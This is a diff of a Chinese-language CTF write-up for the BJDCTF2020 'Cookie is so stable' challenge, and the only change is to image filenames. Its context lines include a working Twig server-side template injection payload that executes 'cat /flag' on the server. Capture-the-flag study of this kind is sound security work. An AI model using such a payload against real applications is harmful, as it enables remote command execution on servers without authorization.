@@ -8,7 +8,7 @@
 
 ## 解题
 
-![](./img/[BJDCTF2020]Cookie is so stable.png)
+![](./img/[BJDCTF2020]Cookieissostable.png)
 
 和之前一题`SSTI`注入比较相似，但是这题过滤了`+`
 
@@ -28,7 +28,7 @@ java:jade velocity jsp
 
  7、确定此处产生`ssti注入`的模板可以为`smarty`、`twig`等，那就一个一个尝试，这里就直接使用`twig`模板的注入方式进行注入了，`payload`：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}`即可成功注入
 
-![](./img/[BJDCTF2020]Cookie is so stable-2.png)
+![](./img/[BJDCTF2020]Cookieissostable-2.png)
 
 `twig`常用的注入`payload`：
 
